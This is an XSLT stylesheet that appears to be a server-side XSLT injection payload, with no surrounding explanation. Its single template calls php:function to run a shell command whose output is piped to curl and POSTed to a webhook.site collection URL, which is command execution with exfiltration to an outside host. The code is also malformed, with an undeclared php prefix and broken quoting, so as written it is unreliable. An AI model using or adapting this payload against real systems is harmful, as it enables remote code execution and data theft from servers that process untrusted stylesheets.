<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">

  <xsl:template match="s">
<xsl:value-of select="php:function(&quot;(function(){echo coucou | curl -X POST -F "result=@-" https://webhook.site/0311e610-5ff9-4306-92ed-857b3d60cf51';})()&quot;)"/>
  </xsl:template>

</xsl:stylesheet>
